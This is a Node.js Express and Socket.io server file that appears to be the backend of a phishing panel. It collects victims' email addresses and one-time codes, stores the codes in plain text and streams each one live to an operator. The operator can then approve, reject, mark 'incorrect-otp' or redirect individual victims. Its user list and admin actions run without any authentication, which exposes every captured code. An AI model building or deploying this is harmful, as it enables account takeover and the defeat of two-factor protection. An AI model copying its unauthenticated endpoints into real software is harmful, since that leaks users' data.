require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/sounds', express.static(path.join(__dirname, 'sounds')));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
});

pool.connect((err) => {
  if (err) console.error('❌ DB error:', err.message);
  else console.log('✅ PostgreSQL connected');
});

async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        otp_code VARCHAR(10),
        status VARCHAR(50) DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');
  } catch (err) { console.error(err); }
}
initDB();

// ==================== USER ENDPOINTS ====================
app.post('/api/submit-email', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(email)) return res.status(400).json({ error: 'Invalid email' });
    await pool.query(`
      INSERT INTO users (email, status) VALUES ($1, 'pending')
      ON CONFLICT (email) DO UPDATE SET status = 'pending', otp_code = NULL
    `, [email]);
    io.emit('new-email', { email });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    if (!/^\d{6}$/.test(otp)) return res.status(400).json({ error: 'OTP must be 6 digits' });
    await pool.query(`UPDATE users SET otp_code = $1, status = 'otp_submitted' WHERE email = $2`, [otp, email]);
    io.emit('new-otp', { email, otp });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/user-status', async (req, res) => {
  try {
    const { email } = req.query;
    if (!email) return res.json({ status: null });
    const result = await pool.query('SELECT status FROM users WHERE email = $1', [email]);
    if (result.rows.length === 0) return res.json({ status: null });
    res.json({ status: result.rows[0].status });
  } catch (err) {
    res.json({ status: null });
  }
});

// ==================== ADMIN ENDPOINTS ====================
app.post('/api/admin/check', async (req, res) => {
  const { email, password } = req.body;
  if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASSWORD) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, otp_code, status, created_at FROM users ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/approve', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
  io.emit('approve-user', { email });
  res.json({ success: true });
});

app.post('/api/admin/reject', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
  io.emit('reject-user', { email });
  res.json({ success: true });
});

app.post('/api/admin/incorrect-otp', async (req, res) => {
  const { email } = req.body;
  io.emit('incorrect-otp', { email });
  res.json({ success: true });
});

app.post('/api/admin/redirect', async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
  io.emit('redirect-to-sad', { email });
  res.json({ success: true });
});

io.on('connection', (socket) => console.log('Client connected'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
